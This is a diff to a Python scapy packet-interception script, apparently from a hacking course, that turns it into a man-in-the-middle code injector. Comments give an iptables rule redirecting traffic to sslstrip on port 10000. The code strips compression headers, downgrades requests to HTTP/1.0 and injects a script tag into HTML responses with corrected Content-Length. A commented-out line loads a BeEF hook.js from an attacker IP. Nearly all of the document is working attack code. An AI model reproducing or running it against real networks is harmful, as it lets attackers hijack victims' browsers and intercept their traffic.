@@ -10,6 +10,8 @@ import re
 # <<GET IP>>        ping -c 1 www.website.com
 # <<WEB SERVER>>    service apache2 start
 # <<IP forwarding>> echo 1 > /proc/sys/net/ipv4/ip_forward
+# <<redirect http to port 10000 for sslstrip>>
+# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 
 
 def set_load(packet, load):
@@ -23,16 +25,29 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
-        if scapy_packet[scapy.TCP].dport == 80:
+        load = scapy_packet[scapy.Raw].load
+        if scapy_packet[scapy.TCP].dport == 10000:
             print("[+] Request")
-            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
-            new_packet = set_load(scapy_packet, modified_load)
-            packet.set_payload(str(new_packet))
-        elif scapy_packet[scapy.TCP].sport == 80:
+            # print(scapy_packet.show())
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+            load = load.replace("HTTP/1.1", "HTTP/1.0")
+
+        elif scapy_packet[scapy.TCP].sport == 10000:
             print("[+] Response")
-            modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('test');</script></body>")
-            new_packet = set_load(scapy_packet, modified_load)
+            # print(scapy_packet.show())
+            injection_code = "<script>alert('test');</script>"
+            # injection_code = '<script src="http://10.0.2.14:3000/hook.js"></script>'
+            load = load.replace("</body>", injection_code + "</body>")
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+            if content_length_search and "text/html" in load:
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
+
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
             packet.set_payload(str(new_packet))
+
     packet.accept()
 
 
